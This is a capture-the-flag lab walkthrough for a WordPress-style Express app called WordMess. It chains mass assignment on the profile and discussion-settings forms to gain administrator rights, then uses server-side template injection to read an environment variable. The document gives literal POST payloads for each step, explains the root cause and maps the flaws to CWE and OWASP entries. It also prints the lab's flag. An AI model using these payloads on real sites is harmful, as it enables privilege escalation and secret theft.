# wordmess-002 - BugForge Lab Walkthrough

**Difficulty:** Hard (Weekly)
**Vulnerability:** Chained mass assignment across two admin forms, escalating to server-side
template injection
**Flag:** `bug{cnfRrJAzaBx35BjOM75s3COV96lha90h}`

---

## Summary

WordMess is a WordPress-flavored content management app built on Node/Express with a
server-rendered `wp-admin` panel. Every privileged form (profile settings, discussion settings,
theme editor) is protected by a real per-user role check and a real per-request CSRF nonce, but
each form handler merges the entire posted body into its target object instead of allowlisting
the specific fields the HTML form exposes. That gap lets a low-privilege account write fields
that were never rendered as inputs at all. Two of those hidden fields chain together: one grants
arbitrary capabilities to the current account, the other silently changes the role assigned to
every future account registration. A second, freshly registered account then inherits full
administrator privileges with zero additional exploitation, and from there a custom template
block evaluates as live server-side code.

---

## Tech Stack

- Express.js (Node.js), server-rendered HTML admin panel (not a JSON API or SPA)
- Session-cookie authentication plus a per-form CSRF nonce scraped from each form's own page
- A proof-of-work based bot-detection gate in front of the whole app (scriptable, no browser
  required)
- A small custom template engine for the site footer supporting `{{ placeholder }}`
  substitution and `<?wm ... ?>` code blocks

---

## Key Endpoints

| Endpoint | Method | Auth | Notes |
|----------|--------|------|-------|
| `/wp-login.php?action=register` | POST | No | New accounts get whatever role the site's default-role setting currently holds |
| `/wp-admin/profile.php` | GET/POST | Any logged-in user | Visible fields cover display name, email, and two bio-related meta keys; handler merges the whole meta object |
| `/wp-admin/options-discussion.php` | GET/POST | Requires a specific capability | Visible fields cover three comment-moderation options; handler merges the whole options object |
| `/wp-admin/theme-editor.php` | GET/POST | Administrator only | Edits the footer template; embedded code blocks are evaluated, not just interpolated |
| `/` | GET | No | Renders the footer template where the injected code block actually executes |

---

## Discovery

The registration endpoint itself is properly defended: posting a `role` field directly is
silently ignored, and the account always comes back as the lowest privilege level. That is
exactly the kind of surface-level correctness that makes this bug easy to miss on a quick sweep,
so the next step was testing every other form that accepts a nested object, not just the
obvious one.

Both `profile.php` and `options-discussion.php` render a narrow HTML form with only a handful of
named inputs, but neither validates that the posted body is limited to those names. Submitting
extra keys under the same object prefix the real fields already use (a `meta[...]` block on the
profile form, an `options[...]` block on the discussion form) revealed that both handlers echo
those extra keys straight into the persisted record. The profile form's extra capability keys
immediately changed which admin pages were reachable, which was the signal that the technique
was live. The discussion form's extra key controlled the registration default role, a setting
with no relationship to comment moderation at all, so a plain content diff between the visible
form fields and what actually got accepted was the key check here rather than any status-code
behavior.

Once an account had administrator access, the template editor's existing example code block
was the tell that the templating syntax evaluates real expressions rather than just filling in
placeholders, which made testing it directly with an environment-variable read the obvious next
step rather than reaching for generic template-injection syntax first.

---

## Proof of Concept

Register a throwaway account and log in normally. Then, using the CSRF nonce scraped from a GET
of the profile form:

```
POST /wp-admin/profile.php
_wpnonce=<nonce>&display_name=atk1&email=atk1@example.com
&meta[wm_bio]=&meta[wm_social]=
&meta[wm_capabilities][manage_options]=1
&meta[wm_capabilities][activate_plugins]=1
&meta[wm_capabilities][edit_theme_options]=1
```

This unlocks the discussion settings page. Using a fresh nonce from that form:

```
POST /wp-admin/options-discussion.php
_wpnonce=<nonce>&options[comment_moderation]=1&options[comment_registration]=0
&options[default_comment_status]=open&options[default_role]=administrator
```

Register a second, completely clean account. No exploitation happens on this request; it simply
inherits administrator privileges from the setting just changed:

```
POST /wp-login.php?action=register
user_login=atk2&user_email=atk2@example.com&pwd=...
```

Logged in as the new administrator, edit the footer template with an injected code block, using
a nonce scraped from the theme editor form:

```
POST /wp-admin/theme-editor.php
_wpnonce=<nonce>&template=Proudly powered by {{ blogname }} &middot; FLAG:<?wm process.env.FLAG ?>
```

Loading the homepage renders the footer and the injected block executes server-side, printing
the flag directly in the page HTML.

---

## Dead Ends

- Writing `role` directly on the registration body or on the profile form - both are correctly
  rejected server-side, and neither is a level of indirection away from the actual bug.
- Looking for a direct "promote my own account" endpoint - none exists. The role change only
  ever applies to accounts registered after the setting is modified, so a second registration is
  a required step, not a shortcut.
- Assuming the intended bug lived in the REST batch API present elsewhere in the app's route
  index - it was completely unrelated to the actual chain here.

---

## Root Cause

Two independent form handlers merge the entire parsed request body into a persisted object
instead of allowlisting the keys their own HTML forms actually expose. Authorization for
admin-only pages is capability-based, but capabilities themselves are writable through one of
those unguarded merges, so the capability check protects nothing once the write path is
reachable by a low-privilege account. A separate site-wide setting that controls the security
posture of every future account is reachable through the second unguarded merge, on a form whose
visible purpose has nothing to do with account roles. Finally, the template editor evaluates
attacker-controlled source as live code with access to process environment variables, turning
administrator access into direct secret disclosure.

## CWE / OWASP

- CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes
- CWE-269: Improper Privilege Management
- CWE-94: Improper Control of Generation of Code (Server-Side Template Injection)
- OWASP API3:2023 - Broken Object Property Level Authorization
- OWASP A01:2021 - Broken Access Control
